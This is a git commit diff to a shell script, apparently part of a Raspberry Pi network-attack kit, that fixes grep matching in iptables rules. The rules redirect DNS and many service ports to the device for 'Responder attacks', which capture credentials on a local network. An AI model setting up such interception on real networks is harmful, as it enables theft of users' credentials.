3a8b2663d9b7a8d42093bd3d456b1d7b7df6704a
s0i37 <s0i37@work>
2021-03-31 20:26:10 +0500

    fix small error in responder

--- on_network/responder.sh
+++ on_network/responder.sh
@@ -3,13 +3,13 @@
 echo '[*] running Responder attacks'
 HOME='/home/pi/'
 
-if ! iptables -t nat -vnL PREROUTING | grep " $1" | grep -q 53; then
+if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q 53; then
   iptables -t nat -A PREROUTING -i "$1" -p udp --dport 53 -j REDIRECT --to-port 53
 fi
 
 for port in 21 25 80 88 110 143 389 443 445 1433 3389
 do
-	if ! iptables -t nat -vnL PREROUTING | grep " $1" | grep -q $port; then
+	if ! iptables -t nat -vnL PREROUTING | grep "$1" | grep -q " $port"; then
 	  iptables -t nat -A PREROUTING -i "$1" -p tcp --dport $port -j REDIRECT --to-port $port
 	fi
 done
